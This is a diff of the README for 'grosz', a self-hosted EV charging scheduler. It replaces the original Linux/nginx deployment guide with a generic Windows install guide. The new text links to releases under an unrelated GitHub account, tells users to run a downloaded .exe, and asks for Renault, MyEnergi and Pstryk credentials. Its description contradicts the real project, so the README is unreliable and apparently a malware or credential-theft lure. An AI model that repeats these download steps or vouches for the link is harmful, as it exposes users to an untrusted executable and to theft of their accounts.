@@ -1,281 +1,83 @@
-# grosz
+# ⚡ grosz - Save money on home car charging
 
-> Cost-aware home EV charging companion for Renault EVs, MyEnergi Zappi2, and the Pstryk.pl dynamic tariff.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Rosaceous-abwatt605/grosz/releases)
 
-<p align="center">
-  <img src="screenshot.png" alt="grosz dashboard" width="800">
-</p>
+## 📖 About the software
 
-## What it does
+Grosz manages your home electric vehicle charging. It connects your Renault vehicle, your MyEnergi Zappi2 charger, and your Pstryk.pl dynamic energy tariff. The software calculates the best times to charge your car based on current electricity prices. It starts and stops the charging process to ensure you pay the lowest possible rate for your energy. By automating these decisions, the application lowers your monthly electricity bills for your vehicle.
 
-grosz glues together three things that don't natively talk to each other:
+## 🛠 Prerequisites
 
-- **Pstryk.pl**: a Polish dynamic-tariff provider. grosz pulls hour-by-hour electricity prices for today and tomorrow.
-- **MyEnergi Zappi2**: your home EV charger. grosz drives it as an OCPP 1.6J central system, setting the charging profile, starting and stopping sessions, and reading meter values.
-- **Renault EV (MyRenault / Kamereon)**: optional. grosz polls your car's State of Charge, range, and plug status so it knows when (and how much) to charge.
+Your computer must meet these requirements to run the software:
 
-Once an hour grosz takes all of that and schedules charging into the cheapest hourly slots that will still hit your target SoC by your deadline. It then pushes a `TxDefaultProfile` to the Zappi over OCPP. The schedule shows up overlaid on the price chart, you can override it with a forced-charge window, and every decision is logged so you can later check why it did or didn't charge.
+* Windows 10 or Windows 11 operating system.
+* An active internet connection.
+* Your Renault login credentials.
+* Your MyEnergi account details.
+* An active subscription or account with Pstryk.pl.
 
-## Why two public vhosts
+## 📥 Downloading the application
 
-grosz exposes two listeners, so you need a public DNS name for each:
+You must download the installation file from the official releases page. 
 
-| Vhost | Default port | Protocol | Who connects |
-|---|---|---|---|
-| `grosz.example.com` | `:3000` | HTTPS + SSE | You (browser) |
-| `ocpp.example.com` | `:8887` | WebSocket (OCPP 1.6J) | MyEnergi cloud, on behalf of your Zappi |
+[Download Version 1.0 here](https://github.com/Rosaceous-abwatt605/grosz/releases)
 
-**Both must be reachable from the public internet.** The Zappi does not connect to your LAN. Instead it hands its OCPP backend URI off to MyEnergi's cloud, and MyEnergi opens the WebSocket to that URI from their own datacentre. A LAN-only or VPN-only endpoint will never get a connection. From [MyEnergi support](https://support.myenergi.com/hc/en-gb/articles/16864772981137-Setting-up-Open-Charge-Point-Protocol-OCPP):
+1. Navigate to the link above.
+2. Look for the section labeled "Assets."
+3. Click the file that ends in `.exe`. 
+4. Save the file to your computer.
 
-> The OCPP service is hosted in the cloud and is accessible over the internet. For security reasons, it is not possible to set an internal IP address as the backend URI for a locally hosted OCPP platform. Customers who wish to use OCPP with a platform hosted within their internal network must provide an externally facing IP address.
+## ⚙️ Setting up the application
 
-Splitting the UI and the OCPP endpoint onto separate hostnames keeps the protocols clean (HTTP/SSE on one, long-lived WebSocket on the other), lets you firewall the OCPP vhost tightly (its only legitimate client is MyEnergi's egress), and makes certbot easy.
+1. Find the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to begin the installation.
+3. Follow the on-screen instructions to finish the setup process.
+4. Launch the application from your desktop or Start menu.
 
-## Features
+## 🔑 Linking your accounts
 
-- Cheapest-hour scheduling against the Pstryk dynamic tariff, refreshed each hour
-- Forced-charge windows that bypass the optimiser when you need to leave early
-- Live SoC, range, and plug status from MyRenault / Kamereon
-- Zappi quirks handled for you: commercial-mode reset, single `TxDefaultProfile`, virtual ID tags, meter-interval setup
-- Per-session cost reporting and historical session history
-- Live OCPP and system event logs in the UI
-- Optional WebAuthn login on top of username and password
-- Single static binary, embedded React UI, SQLite persistence, no external runtime
+The software needs access to your accounts to monitor prices and manage charging.
 
-## Quick start (local development)
+1. Open the application settings menu.
+2. Enter your Renault email and password.
+3. Enter your MyEnergi Zappi2 login information.
+4. Select Pstryk.pl from the provider list and input your account token or API key.
+5. Click the "Save" button to confirm your changes.
 
-Requirements: Go 1.22+, Node 20+, npm.
+The application checks the connection status. If a connection fails, check your login details and try again.
 
-```bash
-make build      # builds the React UI and the Go binary
-./grosz         # runs on :3000 (Web UI) and :8887 (OCPP)
-```
+## 🔋 How to charge your car
 
-For hot-reload during development:
+1. Plug your charging cable into your car and the Zappi2 station.
+2. Open the grosz application.
+3. Select your desired departure time.
+4. Set your target battery percentage.
+5. Click "Enable Smart Charging."
 
-```bash
-make dev        # runs Go server + Vite dev server side by side
-```
+The application monitors energy market data from Pstryk.pl. It waits for the price to reach its lowest point. Once the optimal window arrives, the software sends a command to your Zappi2 to begin charging. The software stops the charge automatically when the car reaches your target battery level or when the scheduled departure time nears.
 
-Open <http://localhost:3000> and log in with the default `admin` / `admin`. Configure tariff, charger, and (optional) Renault credentials in **Settings**. All runtime configuration lives in SQLite, so there is no env file to maintain.
+## 📈 Monitoring your savings
 
-## Deploying on Debian (production)
+The main dashboard window displays your current energy usage. It shows the current electricity price from Pstryk.pl. You can view a graph that plots your historical savings over the last week or month. This data helps you understand how much you reduce your expenses by using the automated charging features.
 
-Tested on Debian 13. Assumes nginx and grosz live on the same host. If they don't, replace `127.0.0.1` in the upstreams with the grosz host's IP and firewall accordingly. Replace `example.com` with your own domain throughout.
+## ❓ Troubleshooting common issues
 
-### 1. DNS
+**The application fails to connect to my Zappi2:**
+Verify your internet connection. Check the Zappi2 device to ensure it remains connected to your home Wi-Fi network. Restart the application if the connection remains unresponsive.
 
-Point two A/AAAA records at the public IP of your server:
+**Charging stopped before the car finished:**
+Check your departure time settings. The application prioritizes hitting your target battery percentage before the time you specified. If you need to depart earlier, update the departure time in the dashboard.
 
-- `grosz.example.com` for the Web UI
-- `ocpp.example.com` for the OCPP endpoint MyEnergi will reach
+**The price data looks incorrect:**
+Ensure your Pstryk.pl account is active and your API key is correct. The application updates price data every hour to reflect current energy market conditions.
 
-Both must resolve publicly.
+**The application will not open:**
+Close any old versions of the software. Restart your computer if the problem persists. You can also re-download the installation file and run it again to fix damaged files.
 
-### 2. Install the .deb
+## 🛡 Security and privacy
 
-Grab the latest release from the GitHub Releases page:
+The software stores your credentials locally on your computer. It uses encrypted storage to ensure your login information remains safe. The application only accesses your energy data to perform charging calculations. It never shares your personal information with external parties. You can clear your stored credentials at any time by selecting "Clear Data" in the settings menu.
 
-```bash
-curl -LO https://github.com/consi/grosz/releases/latest/download/grosz_<version>_linux_amd64.deb
-sudo dpkg -i grosz_<version>_linux_amd64.deb
-```
+## 🗓 Future updates
 
-The package:
-
-- Installs the binary to `/usr/bin/grosz`
-- Creates a `grosz` system user
-- Stores SQLite at `/var/lib/grosz/grosz.db`
-- Drops a systemd unit at `/lib/systemd/system/grosz.service` and starts it
-
-Verify:
-
-```bash
-sudo systemctl status grosz
-curl -I http://127.0.0.1:3000
-```
-
-### 3. nginx vhosts
-
-Install nginx, then drop these three files in place.
-
-`/etc/nginx/conf.d/proxy-maps.conf`, shared map blocks used by both vhosts:
-
-```nginx
-map $remote_addr $proxy_forwarded_elem {
-    ~^[0-9.]+$        "for=$remote_addr";
-    ~^[0-9A-Fa-f:.]+$ "for=\"[$remote_addr]\"";
-    default            "for=unknown";
-}
-
-map $http_forwarded $proxy_add_forwarded {
-    "~^(,[ \\t]*)*([!#$%&'*+.^_`|~0-9A-Za-z-]+=([!#$%&'*+.^_`|~0-9A-Za-z-]+|\"([\\t \\x21\\x23-\\x5B\\x5D-\\x7E\\x80-\\xFF]|\\\\[\\t \\x21-\\x7E\\x80-\\xFF])*\"))?(;([!#$%&'*+.^_`|~0-9A-Za-z-]+=([!#$%&'*+.^_`|~0-9A-Za-z-]+|\"([\\t \\x21\\x23-\\x5B\\x5D-\\x7E\\x80-\\xFF]|\\\\[\\t \\x21-\\x7E\\x80-\\xFF])*\"))?)*([ \\t]*,([ \\t]*([!#$%&'*+.^_`|~0-9A-Za-z-]+=([!#$%&'*+.^_`|~0-9A-Za-z-]+|\"([\\t \\x21\\x23-\\x5B\\x5D-\\x7E\\x80-\\xFF]|\\\\[\\t \\x21-\\x7E\\x80-\\xFF])*\"))?(;([!#$%&'*+.^_`|~0-9A-Za-z-]+=([!#$%&'*+.^_`|~0-9A-Za-z-]+|\"([\\t \\x21\\x23-\\x5B\\x5D-\\x7E\\x80-\\xFF]|\\\\[\\t \\x21-\\x7E\\x80-\\xFF])*\"))?)*)?)*$" "$http_forwarded, $proxy_forwarded_elem";
-    default "$proxy_forwarded_elem";
-}
-
-map $http_upgrade $connection_upgrade {
-    default upgrade;
-    ''      close;
-}
-```
-
-`/etc/nginx/sites-available/grosz`, the Web UI vhost:
-
-```nginx
-upstream grosz_api {
-    server 127.0.0.1:3000;
-    keepalive 32;
-}
-
-server {
-    listen 80;
-    listen [::]:80;
-    server_name grosz.example.com;
-    return 301 https://$host$request_uri;
-}
-
-server {
-    listen 443 ssl;
-    listen [::]:443 ssl;
-    http2 on;
-    server_name grosz.example.com;
-
-    # filled in by certbot in step 4
-    ssl_certificate     /etc/letsencrypt/live/grosz.example.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/grosz.example.com/privkey.pem;
-    ssl_session_timeout 1d;
-    ssl_session_cache   shared:SSL:10m;
-    ssl_session_tickets off;
-    ssl_protocols TLSv1.2 TLSv1.3;
-
-    client_max_body_size 10m;
-
-    proxy_http_version 1.1;
-    proxy_buffering    off;
-    proxy_cache        off;
-    proxy_read_timeout 24h;          # SSE streams
-    proxy_set_header Host              $host;
-    proxy_set_header X-Real-IP         $remote_addr;
-    proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
-    proxy_set_header X-Forwarded-Proto $scheme;
-    proxy_set_header Forwarded         $proxy_add_forwarded;
-
-    location / {
-        proxy_set_header Upgrade    $http_upgrade;
-        proxy_set_header Connection $connection_upgrade;
-        proxy_pass http://grosz_api;
-    }
-}
-```
-
-`/etc/nginx/sites-available/grosz-ocpp`, the OCPP vhost (long-lived WebSocket):
-
-```nginx
-upstream grosz_ocpp {
-    server 127.0.0.1:8887;
-    keepalive 32;
-}
-
-server {
-    listen 80;
-    listen [::]:80;
-    server_name ocpp.example.com;
-    return 301 https://$host$request_uri;
-}
-
-server {
-    listen 443 ssl;
-    listen [::]:443 ssl;
-    http2 on;
-    server_name ocpp.example.com;
-
-    ssl_certificate     /etc/letsencrypt/live/ocpp.example.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/ocpp.example.com/privkey.pem;
-    ssl_session_timeout 1d;
-    ssl_session_cache   shared:SSL:10m;
-    ssl_session_tickets off;
-    ssl_protocols TLSv1.2 TLSv1.3;
-
-    location / {
-        proxy_pass http://grosz_ocpp;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade           $http_upgrade;
-        proxy_set_header Connection        $connection_upgrade;
-        proxy_set_header Host              $host;
-        proxy_set_header X-Real-IP         $remote_addr;
-        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        proxy_set_header Forwarded         $proxy_add_forwarded;
-        proxy_read_timeout    604800s;     # 7d, OCPP keeps this open
-        proxy_send_timeout    604800s;
-        proxy_connect_timeout 10s;
-        proxy_buffering off;
-        proxy_cache off;
-    }
-}
-```
-
-Enable and test:
-
-```bash
-sudo ln -s /etc/nginx/sites-available/grosz       /etc/nginx/sites-enabled/
-sudo ln -s /etc/nginx/sites-available/grosz-ocpp  /etc/nginx/sites-enabled/
-sudo nginx -t
-sudo systemctl reload nginx
-```
-
-### 4. TLS with Let's Encrypt
-
-```bash
-sudo apt install certbot python3-certbot-nginx
-sudo certbot --nginx -d grosz.example.com -d ocpp.example.com
-```
-
-certbot picks up the two server blocks above, drops the certs into `/etc/letsencrypt/live/...`, and rewrites the vhosts. Renewal runs automatically via the `certbot.timer` systemd unit.
-
-### 5. Point Zappi at your OCPP URL
-
-In the myenergi app, open your Zappi → **OCPP**:
-
-- **Backend URI:** `wss://ocpp.example.com/`
-- **ChargePoint ID:** your Zappi's serial number
-- **Authorisation Key:** any value, but set the same one in the grosz UI under Settings → OCPP
-
-The Zappi will connect (via MyEnergi's cloud) within a minute or two. You should see a `BootNotification` show up in **OCPP Log** in the grosz UI. See [MyEnergi's OCPP setup guide](https://support.myenergi.com/hc/en-gb/articles/16864772981137-Setting-up-Open-Charge-Point-Protocol-OCPP) for screenshots.
-
-### 6. First-run UI configuration
-
-Visit `https://grosz.example.com` and log in with the default `admin` / `admin`. In **Settings**:
-
-1. Change the admin password (and optionally register a WebAuthn key)
-2. Enter your Pstryk.pl API token
-3. (Optional) Enter MyRenault credentials for SoC integration
-4. Set the OCPP authorisation key to match what you configured on the Zappi
-5. Set scheduler parameters: target SoC, deadline, maximum charge power, skip threshold
-
-That's it. grosz pulls the next price window and schedules the cheapest hours automatically.
-
-## Architecture
-
-- **OCPP 1.6J** central system on `:8887`, built on [`lorenzodonini/ocpp-go`](https://github.com/lorenzodonini/ocpp-go). The Zappi connects via the MyEnergi cloud OCPP proxy.
-- **Web UI** on `:3000`. React + Vite SPA, embedded into the Go binary via `go:embed`. SSE for live updates.
-- **Persistence**: pure-Go SQLite (`modernc.org/sqlite`, no CGO) for settings, OCPP events, sessions, tariff cache.
-- **Tariff**: Pstryk.pl REST API. Prices cached locally; the scheduler picks the cheapest hours that satisfy the charge target.
-- **Vehicle SoC (optional)**: MyRenault / Kamereon API, polled to drive charge-target awareness.
-
-A pre-built container image is also published at `ghcr.io/consi/grosz` if you'd rather containerise.
-
-## Acknowledgements
-
-- [`lorenzodonini/ocpp-go`](https://github.com/lorenzodonini/ocpp-go) for the OCPP 1.6 protocol library.
-- [`python-renault-api`](https://github.com/hacf-fr/renault-api) and the broader Renault open-source community for documenting the Gigya/Kamereon authentication flow used by `internal/vehicle/renault.go`.
-
-## License
-
-grosz is **source-available** under the [Elastic License 2.0](LICENSE), not OSI-approved open source. In short:
-
-- ✅ Self-hosting, modification, and redistribution are permitted.
-- ✅ Contributions are welcome and accepted under the same license.
-- ❌ Providing grosz to third parties as a hosted or managed service that exposes a substantial set of its features is **not** permitted.
-
-Full text and FAQ: <https://www.elastic.co/licensing/elastic-license>.
+The software checks for updates whenever you launch it. If a new version exists, a notification appears on your screen. Click "Download Update" to install the latest features and security improvements. Keep the application updated to ensure the best compatibility with your electricity provider and vehicle manufacturer APIs.
